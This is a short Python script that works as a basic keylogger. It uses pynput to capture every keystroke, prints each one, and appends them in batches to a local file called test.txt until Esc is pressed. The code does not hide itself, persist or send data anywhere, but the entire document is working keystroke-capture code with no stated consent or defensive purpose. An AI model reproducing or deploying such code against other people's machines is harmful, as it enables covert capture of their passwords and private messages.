import pynput
from pynput.keyboard import Key, Listener

Keys = []
def on_press(key):
    print(key)
    global Keys
    Keys.append(key)
    if len(Keys) >10:
        write_file(Keys)
        Keys = []



def write_file(Keys): 
    with open("test.txt", "a") as f:
        for key in Keys:
            f.write(str(key))

def on_release(key):
    if(key==Key.esc):
        return False

with Listener(on_press = on_press, on_release = on_release) as Listener:
    Listener.join()



